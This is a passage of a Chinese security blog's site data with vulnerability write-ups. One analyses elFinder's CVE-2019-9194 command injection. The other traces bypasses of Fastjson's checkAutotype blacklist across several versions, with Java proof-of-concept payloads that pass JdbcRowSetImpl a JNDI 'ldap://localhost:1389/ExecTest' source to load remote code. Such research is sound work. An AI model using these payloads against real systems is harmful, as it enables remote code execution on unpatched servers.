title=\"写在后面\"></a>写在后面</h2><p>这个漏洞如果想成功利用，目标服务器上需装有exiftran,否则无法复现该漏洞</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/威胁情报的定义及使用.jpg","excerpt":"<p>CVE-2019-9194，这是一个很神奇的漏洞。<br>开发者在漏洞的上一行，用了过滤方法对传入的参数进行过滤，然而到了下一行，却手一抖，直接用传入的未过滤的参数拼接cmd，进行执行，造成了远程代码执行漏洞</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>elFinder是一个用于Web的开源文件管理器，使用jQuery UI以JavaScript编写。创作的灵感来自于Mac OS X操作系统中使用的Finder程序的简单性和便利性。</p>\n<p>相关的漏洞说明可以见如下packet storm的链接：<br><a href=\"https://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html\">https://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html</a></p>\n<p>elFinder这个项目可以在github上找到，该项目的star数为3195，可见此次漏洞影响范围还是不小的。</p>\n<p>本次漏洞是在2.1.48版本修复的，官方在readme中强调需要升级最新的版本以修复该漏洞。<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164505-a1b0bc52-46fe-1.png\" alt=\"1.png\"></p>\n<p>现在来看一下2.1.48中是如何修复的，以便于我们找到这个漏洞的触发点。</p>\n<p>不得不吐槽，这个项目的版本控制很奇怪。。。<br>按照以往经验，既然在下一个版本修复的，那我们就应该在下一个版本的release commits中寻找修复方案<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164545-b9793f1c-46fe-1.png\" alt=\"2.png\"><br>但是这7个commits里并没有关于漏洞的修复，至少看起来都不像是修复漏洞用的。</p>\n<p>仔细研究里下他的提交记录后，发现这个项目是在2.1这个版本上进行修改，然后release 不同的版本（2.1.47/2.1.48/）<br>其实从2.1.48release的记录上来看，7 commits to 2.1 since this release 就可以看出来了，48版本并不是在47版本上修改得来的，所以看48的release没有用。<br>这里应该看2.1.47的<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164611-c89165f6-46fe-1.png\" alt=\"3.png\"><br>由于改动都是在2.1上进行的，因此比较2.1与2.1.47之间的commits就可以找到47漏洞所在了。</p>\n<p>漏洞位于php/elFinderVolumeDriver.class.php中的imgRotate方法中<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164639-d9b04faa-46fe-1.png\" alt=\"4.png\"><br>从这里的修复来看，漏洞触发点一定是位于这里。</p>\n<p>可以看见修复有两点：<br>其一：使用$quotedPath替换原来的$path参数，这个$quotedPath一直存在，可见开发者还是有安全意识的，但是在写代码时候估计是写错了。<br>其二：用 “–”来来结束后面的参数选项  </p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164955-4e81a590-46ff-1.png\" alt=\"5.png\"><br>这里可以参见命令行解析器中，“–”的意思，“– 表示选项结束并禁用进一步的选项处理。 – 之后的任何参数都被视为文件名和参数。”</p>\n<p>也就是说，可以有效的防止了传入参数选项而绕过escapeshellarg，可以参见gitlist 0.6.0远程命令执行漏洞。<br>通过分析补丁，我们已经摸清触发点所在，并且了解是如何修复的，下面来看下漏洞是如何利用的。</p>\n<p>首先跟一下存在漏洞的函数 imgRotate，看看被哪个方法调用</p>\n<p>位于\\php\\elFinderVolumeDriver.class.php中的resize方法中调用imgRotate方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165038-67c1d7aa-46ff-1.png\" alt=\"7.png\"><br>可见这里的$work_path被传入imgRotate中</p>\n<p>而在imgRotate中，此$path 参数被直接拼到$cmds[]中，如下图：<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165055-7244dcc2-46ff-1.png\" alt=\"8.png\"><br>拼接后的$cmds[]接着被遍历传入proExec中执行</p>\n<p>proExec代码如下<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165112-7c086f26-46ff-1.png\" alt=\"9.png\"></p>\n<p>也就是说，如果这个$work_path可控，那么就会导致代码执行。</p>\n<p>看一下漏洞利用poc</p>\n<p>首先，上传一个图片，图片名为构造好的poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165202-9a147032-46ff-1.png\" alt=\"10.png\"></p>\n<p>通过返回的json，可以知道该图片的hash值</p>\n<p>用该hash值构造请求，以剪裁改图片</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165233-ac528932-46ff-1.png\" alt=\"11.png\"><br>在检测图片过程中，由于path为我们构造的恶意数据，导致代码执行。</p>\n<p>运行一下packetstorm上给出的poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165247-b4d04eb4-46ff-1.png\" alt=\"12.png\"><br>直接跳到resize部分</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165301-bcd7c312-46ff-1.png\" alt=\"13.png\"><br>这里的$path值是由上传的图片的hash解码出来的，可见我们构造的数据被包含在其中。</p>\n<p>接着，$path值传递给$work_path</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165318-c708b1ac-46ff-1.png\" alt=\"14.png\"></p>\n<p>接着$work_path传入imgRotate中<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165334-d0b4e5ae-46ff-1.png\" alt=\"15.png\"></p>\n<p>接着，我们构造的参数被拼接到$cmds[]中<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165352-db43f320-46ff-1.png\" alt=\"16.png\"></p>\n<p>最后，拼接完成的指令被传入procExec中的proc_open方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165411-e6ccc762-46ff-1.png\" alt=\"17.png\"></p>\n<p>构造好的代码最终被执行<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165437-f648993c-46ff-1.png\" alt=\"18.png\"></p>\n<h2 id=\"写在后面\"><a href=\"#写在后面\" class=\"headerlink\" title=\"写在后面\"></a>写在后面</h2><p>这个漏洞如果想成功利用，目标服务器上需装有exiftran,否则无法复现该漏洞</p>"},{"title":"Fastjson历史漏洞研究(一)","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/aed42176e4452c3808195c113a45ca8.jpg","date":"2020-09-15T09:46:54.000Z","_content":"\n本文衔接上一篇文章[《Fastjson 1.2.24反序列化漏洞深度分析》](http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/)，继续探讨一下FastJson的历史漏洞。\n\n在《Fastjson 1.2.24反序列化漏洞深度分析》一文中，我们以Fastjson 1.2.24反序列化漏洞为基础，详细分析fastjson漏洞的一些细节问题。\n\nFastjson 1.2.24 版本的远程代码执行漏洞可谓是开辟了近几年来Fastjson漏洞的纪元。在Fastjson 1.2.24版本反序列化漏洞初次披露之后，官方针对这个漏洞进行了修补。然而这个修复方案很快就被发现存在绕过的风险。由于官方的修复方案或多或少都存在着一些问题，随之而来的是一次又一次的绕过与修复。\n\n回顾一下Fastjson反序列化漏洞，简单来说就是：fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用。com.sun.rowset.JdbcRowSetImpl这条利用链用到的是类中setter方法的缺陷，而TemplatesImpl利用链则用到的是getter方法缺陷。\n\n官方主要的修复方案是引入了checkAutotype安全机制，通过黑白名单机制进行防御。在随后的版本中，为了增强漏洞绕过的难度，又在checkAutotype中采用了一定的加密混淆将本来明文存储的黑名单进行加密。\n\n在简单的介绍完Fastjson 1.2.24版本远程代码执行漏洞后，我们来看一下官方是怎么修复这个漏洞的。\n\ncheckAutotype安全机制\n---------------------\n\nFastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。我们先来看一下1.2.25版本初次引入的checkAutotype安全机制的形式，首先来看几个示例\n\n1. 示例一\n\n```java\npackage AutoTypeTest;\n\nimport com.alibaba.fastjson.JSON;\n\nclass ForTest{\n    public  String s1;\n\n    public String getS1() {\n        return s1;\n    }\n\n    public void setS1(String s1) {\n        this.s1 = s1;\n    }\n}\npublic class demo {\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.ForTest\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n这是一个很普通的测试样例，用来将字符串转变为Java对象。执行结果如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3d7f965f988e8e297889dc6d75d8f4b6.png)\n\n这个测试样例在1.2.24版本是可以执行成功的，但在1.2.25版本中却爆出来autoType is not support错误。\n\n这是因为Fastjson 1.2.25版本引入了checkAutotype安全机制。在默认情况下AutoTypeSupport关闭且测试样例中的AutoTypeTest.ForTest类虽然不在黑名单上，但也并不在checkAutotype安全机制白名单上，因此使用上图测试样例在Fastjson 1.2.25版本中反序列化失败。\n\n2. 示例二\n\n在这个示例中，我们将AutoTypeSupport设置为true\n\n```java\npublic class demo {\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.ForTest\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n在开启AutoTypeSupport后，AutoTypeTest.ForTest类反序列化成功\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/81f432dbf98c947a76eab4f798339a02.png)\n\n3. 示例三\n\n这一次换成恶意类，再进行一次实验\n\n```java\npublic class demo {\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\" + \" \\\"autoCommit\\\":true}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n动态调试一下经过动态调试可以发现，程序在执行到com/alibaba/fastjson/parser/ParserConfig.java中checkAutoType安全机制时，com.sun.rowset.JdbcRowSetImpl类会触发黑名单，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/19d24d1278cfdd136f09593ad29112a1.png)\n\n程序将抛出错误\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5a0becd8ef816df3112cd1d90d1c76aa.png)\n\n我们来看一下Fastjson 1.2.25版本中引入的黑名单中元素都有哪些，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png)\n\n这次实验中的poc无法成功利用，是因为com.sun.rowset.JdbcRowSetImpl类命中了黑名单而不能反序列化成功。\n\n在这里额外介绍一下：当程序经过黑白名单的校验之后，接下来会通过TypeUtils.loadClass方法对类进行反序列化加载\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png)\n\nTypeUtils.loadClass方法的实现比较有意思，下文要介绍的几处漏洞也与之有关。\n\nFastjson 1.2.41版本漏洞\n-----------------------\n\n1.2.41版本漏洞利用，其实就是针对1.2.24版本漏洞所打的补丁的绕过，本次漏洞影响了1.2.41版本以及之前的版本\n\n首先来看一下1.2.41版本漏洞利用的poc\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png)\n\n可以发现，@type字段值为”Lcom.sun.rowset.JdbcRowSetImpl;”\n\n在”com.sun.rowset.JdbcRowSetImpl”类的首尾多出了一个L与;\n\n经过上文的介绍，我们知道@type字段值会经过黑名单校验\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png)\n\n黑名单的检测机制很简单，就是用黑名单中的元素依次与@type字段值进行字符串匹配，从@type字段值从首位开始，匹配到了黑名单中的元素，就会抛出错误。\n\n很明显，”Lcom.sun.rowset.JdbcRowSetImpl;”并不会匹配到黑名单。但是有一个问题：黑名单匹配机制明显不管@type字段值末位是什么，又是为何在末位加一个”;”呢？首位的”L”又是什么呢？我们随后会介绍一下这个。\n\n通过上文对checkAutotype安全机制的解释可以发现，@type字段值首先会经过黑白名单的校验。在成功通过校验之后，程序接下来会通过TypeUtils.loadClass方法对类进行加载\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png)\n\n让我们来跟入位于com/alibaba/fastjson/util/TypeUtils.java中的loadClass方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/905ad768dd7cc2540c00a101956694f1.png)\n\n从上图可见，在该方法中有两次if语句，见上图红框处\n\n从字面意义上来看，第一处的作用是匹配以”[”开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串。\n\n这一点看起来与poc中的结构很相似，poc中构造的结构应该就是为这里准备的。\n\n我们接下来就来分析一下，”[”、 ”L”、”;”这些都是什么？以及为什么FastJson为什么要写两处if逻辑来处理他们。\n\n### JNI字段描述符\n\n首先我们来思考一个题外话，如何获取一个类的数组类型的Class对象？ 可参考下面demo\n\n```java\npackage AutoTypeTest;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\nimport java.lang.reflect.Array;\n\nclass ForTest{\n\n\n    public  String s1;\n\n    public ForTest(){\n        this.s1 =\"1\" ;\n\n    }\n\n    public String getS1() {\n        return s1;\n    }\n\n    public void setS1(String s1) {\n        this.s1 = s1;\n    }\n\n}\npublic class demo {\n    public static void main(String[] args) throws ClassNotFoundException {\n\n\n        //方法一\n        ForTest[] ar = new ForTest[1];\n        Class<?> clazz1 =  ar.getClass();\n\n        //方法二\n        Class<?> clazz2 = Array.newInstance(ForTest.class, 0).getClass();\n\n        //方法三\n        Class clazz3 = Class.forName(\"[LAutoTypeTest.ForTest;\");\n```\n\n上述demo中三种方式都可以获取一个类的数组类型的Class对象\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b9770b8f656ab3a4ebbb42e9f82e3406.png)\n\n通过调试结果可见，clazz1、clazz2、clazz3的name是一样的，都为字符串”[LAutoTypeTest.ForTest;”。\n\n”[LAutoTypeTest.ForTest;”这种形式的字符串其实是一种对函数返回值和参数的编码，名为JNI字段描述符（JavaNative Interface FieldDescriptors)。\n\nAutoTypeTest.ForTest类的Class对象名为”AutoTypeTest.ForTest”；为了区分，AutoTypeTest.ForTest类的数组类型的Class对象名则为”[LAutoTypeTest.ForTest;”这样的形式。其中首个字符”[”用以表示数组的层数，而第二个字符则代表数组的类型。\n\n这里举例说明一下JNI字段描述符的格式：\n\n- double\\[\\]\\[\\]对应的类对象名为\"[[D\"\n\n- int[]对应的类对象名则为\"[I\"\n\n- AutoTypeTest.ForTest[]对应的类对象名则为\"[LAutoTypeTest.ForTest;\"\n\n前两者比较好理解，而第三个”[LAutoTypeTest.ForTest;”，可见第二个字符是”L”,且最后一个字符是”;”。这种形式叫类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）。这就是为什么FastJson中要有下图这样的两处if逻辑，实际上是用来解析传入的数组类型的Class对象字符串\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5cecd42324d592731c44d90c8c21f5b.png)\n\n### 漏洞利用\n\n经过我们上文的分析，已经对漏洞以及构造有了一定的了解。接下来重点来看下FastJson解析类描述符的代码，见下图：\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e02029eade7ee2d5a534ee7961eec2c2.png)\n\n从上图代码不难看出，当传入的类名以”L”开头，且以”;”结尾时，程序将去除首尾后返回。这意味着，如果在恶意类前后加上”L”与”;”，例如”LAutoTypeTest.ForTest;”，这样不仅可以轻易的躲避黑名单，随后在程序执行到这里时，还会将首尾附加的”L”与”;”剥去。剥皮处理之后字符串变成”AutoTypeTest.ForTest”，接着”AutoTypeTest.ForTest”被loadClass加载，恶意类被成功反序列化利用。我们构造一个如下图的poc，测验以下我们的判断是否是否正确：\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png)\n\n经过动态调试后发现，程序的确进入如下if分支，并且剥去前后”L”与”;”\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/204f15e90a91f18369ab74875437598c.png)\n\n我们构造的poc执行成功。在poc执行成功后，计算器顺利的弹出\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/02c17ac61b4f3029ea2fa0635bbc2548.png)\n\n上述漏洞在Fastjson 1.2.42版本中被修复，从Fastjson 1.2.42版本发布的升级说明中可以看到这点\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/16b8d1899466896e9a2c642d0638a120.png)\n\nFastjson 1.2.42版本漏洞\n-----------------------\n\nFastjson 1.2.42版本在处理了1.2.41版本的漏洞后。很快又被发现存在着绕过方式。我们接下来分析下Fastjson 1.2.42中的checkAutotype安全机制，看看Fastjson 1.2.42的更新是怎么处理1.2.41版本漏洞的。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/127e8ce129efb319c1a03119f550f8dc.png)\n\n从上图可以发现，不同于之前的版本，程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。此时的黑名单也变成如下的样子\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f796a6f9ed3d05d3f7f4e41c4df4a283.png)\n\n针对这里的黑名单的原文明文也是有人曾经研究过的，可以参考如下链接\n\nhttps://github.com/LeadroyaL/fastjson-blacklist\n\n除了引入了黑名单加密混淆机制外，checkAutotype中也加入了一些新的机制，如下图这里\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b8159ba031debf45a5a98c088f859ea8.png)\n\n与之前的版本相比，这里多出了上图这一段代码。从代码上大体可以猜测出来，这是用来判断类名的第一个字符与最后一个字符是否满足一定条件，然后将首尾剥去。这里又看到熟悉的剥皮操作了，我们不难猜测到这两个满足条件的字符大概率是”L”与”;”。开发者的用意大概是想针对于1.2.41版本的利用”Lcom.sun.rowset.JdbcRowSetImpl;”，先剥去传入类名首尾的”L”与”;”，以便将恶意数据暴露出来，再经过黑名单校验。\n\n我们写个小测试，看看这俩字符是不是”L”与”;”\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0a1d4125f31b560b3d2cfcddd0bcbaf9.png)\n\n实践证明，FastJson这里要去除的还真是首尾的”L”与”;”\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6298aa075e5553217bd7f5042c484f3e.png)\n\n### 漏洞利用\n\n因为这里很容易猜出怎么绕过，因此我们先不贴poc，一步步分析下执行流程最终构造处正确的poc。\n\n首先程序进入checkAutoType后，进入如下两个if分支进行处理\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ac1453b99590452916dd6336ef14c1ba.png)\n\n第一个if分支，是用来限制传入的类名长度的，这里只要我们传入的poc中类名长度在3与128之间即可。而第二个分支，我们上文已经分析过了，目的是剥去类名中的首尾”L”与”;”。因此构造如下poc即可轻易绕过FastJson1.2.42版本\n\n```java\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\" + \" \\\"autoCommit\\\":true}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n```\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d1f0ba0089fc7f64635cbd52afe5350c.png)\n\nFastjson 1.2.45版本漏洞\n-----------------------\n\n在Fastjson 1.2.45版本中，checkAutotype安全机制又被发现了一种绕过方式。之前的几次绕过都是针对checkAutoType的绕过，而这次则是利用了一条黑名单中不包含的元素，从而绕过了黑名单限制。\n\n本次绕过利用到的是mybatis库。如果想测试成功，需要额外安装mybatis库。下文测试用例中安装的版本是3.5.5。\n\n首先简单介绍下mybatis，maven上的简介如下：\n\n> “MyBatis SQL映射器框架使将关系数据库与面向对象的应用程序结合使用变得更加容易。MyBatis使用XML描述符或注释将对象与存储过程或SQL语句耦合。相对于对象关系映射工具，简单性是MyBatis数据映射器的最大优势。”\n\n### 漏洞利用\n\n本次利用poc如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/23689542db1576061ec011f3d10ca794.png)\n\n从poc中不难发现，@type指定了JndiDataSourceFactory类，而在properties属性中的data_source变量中指定恶意数据源。由于JndiDataSourceFactory并不在黑名单上，因此可以顺利通过黑名单校验，在接下来的反序列化过程中，在为Properties变量赋值时调用其setter方法，可见下图动态调试结果\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8bf6a23d27b5eca427263eee78bb4b71.png)\n\n在上图setProperties方法中，程序将取出poc中构造的DATA_SOURCE值并触发漏洞\n\n写在最后\n--------\n\n除了上文分析的漏洞之外，FastJson还有几个很精彩的漏洞，例如Fastjson 1.2.47版本和1.2.68版本的漏洞。因为篇幅有限，要写的实在太多了，因此我把它们抽出来放在后续文章中介绍。","source":"_posts/fastjsonsecurity1.md","raw":"---\ntitle: Fastjson历史漏洞研究(一)\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/aed42176e4452c3808195c113a45ca8.jpg\ndate: 2020-09-15 17:46:54\n---\n\n本文衔接上一篇文章[《Fastjson 1.2.24反序列化漏洞深度分析》](http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/)，继续探讨一下FastJson的历史漏洞。\n\n在《Fastjson 1.2.24反序列化漏洞深度分析》一文中，我们以Fastjson 1.2.24反序列化漏洞为基础，详细分析fastjson漏洞的一些细节问题。\n\nFastjson 1.2.24 版本的远程代码执行漏洞可谓是开辟了近几年来Fastjson漏洞的纪元。在Fastjson 1.2.24版本反序列化漏洞初次披露之后，官方针对这个漏洞进行了修补。然而这个修复方案很快就被发现存在绕过的风险。由于官方的修复方案或多或少都存在着一些问题，随之而来的是一次又一次的绕过与修复。\n\n回顾一下Fastjson反序列化漏洞，简单来说就是：fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用。com.sun.rowset.JdbcRowSetImpl这条利用链用到的是类中setter方法的缺陷，而TemplatesImpl利用链则用到的是getter方法缺陷。\n\n官方主要的修复方案是引入了checkAutotype安全机制，通过黑白名单机制进行防御。在随后的版本中，为了增强漏洞绕过的难度，又在checkAutotype中采用了一定的加密混淆将本来明文存储的黑名单进行加密。\n\n在简单的介绍完Fastjson 1.2.24版本远程代码执行漏洞后，我们来看一下官方是怎么修复这个漏洞的。\n\ncheckAutotype安全机制\n---------------------\n\nFastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。我们先来看一下1.2.25版本初次引入的checkAutotype安全机制的形式，首先来看几个示例\n\n1. 示例一\n\n```java\npackage AutoTypeTest;\n\nimport com.alibaba.fastjson.JSON;\n\nclass ForTest{\n    public  String s1;\n\n    public String getS1() {\n        return s1;\n    }\n\n    public void setS1(String s1) {\n        this.s1 = s1;\n    }\n}\npublic class demo {\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.ForTest\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n这是一个很普通的测试样例，用来将字符串转变为Java对象。执行结果如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3d7f965f988e8e297889dc6d75d8f4b6.png)\n\n这个测试样例在1.2.24版本是可以执行成功的，但在1.2.25版本中却爆出来autoType is not support错误。\n\n这是因为Fastjson 1.2.25版本引入了checkAutotype安全机制。在默认情况下AutoTypeSupport关闭且测试样例中的AutoTypeTest.ForTest类虽然不在黑名单上，但也并不在checkAutotype安全机制白名单上，因此使用上图测试样例在Fastjson 1.2.25版本中反序列化失败。\n\n2. 示例二\n\n在这个示例中，我们将AutoTypeSupport设置为true\n\n```java\npublic class demo {\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.ForTest\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n在开启AutoTypeSupport后，AutoTypeTest.ForTest类反序列化成功\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/81f432dbf98c947a76eab4f798339a02.png)\n\n3. 示例三\n\n这一次换成恶意类，再进行一次实验\n\n```java\npublic class demo {\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\" + \" \\\"autoCommit\\\":true}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n动态调试一下经过动态调试可以发现，程序在执行到com/alibaba/fastjson/parser/ParserConfig.java中checkAutoType安全机制时，com.sun.rowset.JdbcRowSetImpl类会触发黑名单，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/19d24d1278cfdd136f09593ad29112a1.png)\n\n程序将抛出错误\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5a0becd8ef816df3112cd1d90d1c76aa.png)\n\n我们来看一下Fastjson 1.2.25版本中引入的黑名单中元素都有哪些，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png)\n\n这次实验中的poc无法成功利用，是因为com.sun.rowset.JdbcRowSetImpl类命中了黑名单而不能反序列化成功。\n\n在这里额外介绍一下：当程序经过黑白名单的校验之后，接下来会通过TypeUtils.loadClass方法对类进行反序列化加载\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png)\n\nTypeUtils.loadClass方法的实现比较有意思，下文要介绍的几处漏洞也与之有关。\n\nFastjson 1.2.41版本漏洞\n-----------------------\n\n1.2.41版本漏洞利用，其实就是针对1.2.24版本漏洞所打的补丁的绕过，本次漏洞影响了1.2.41版本以及之前的版本\n\n首先来看一下1.2.41版本漏洞利用的poc\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png)\n\n可以发现，@type字段值为”Lcom.sun.rowset.JdbcRowSetImpl;”\n\n在”com.sun.rowset.JdbcRowSetImpl”类的首尾多出了一个L与;\n\n经过上文的介绍，我们知道@type字段值会经过黑名单校验\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png)\n\n黑名单的检测机制很简单，就是用黑名单中的元素依次与@type字段值进行字符串匹配，从@type字段值从首位开始，匹配到了黑名单中的元素，就会抛出错误。\n\n很明显，”Lcom.sun.rowset.JdbcRowSetImpl;”并不会匹配到黑名单。但是有一个问题：黑名单匹配机制明显不管@type字段值末位是什么，又是为何在末位加一个”;”呢？首位的”L”又是什么呢？我们随后会介绍一下这个。\n\n通过上文对checkAutotype安全机制的解释可以发现，@type字段值首先会经过黑白名单的校验。在成功通过校验之后，程序接下来会通过TypeUtils.loadClass方法对类进行加载\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png)\n\n让我们来跟入位于com/alibaba/fastjson/util/TypeUtils.java中的loadClass方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/905ad768dd7c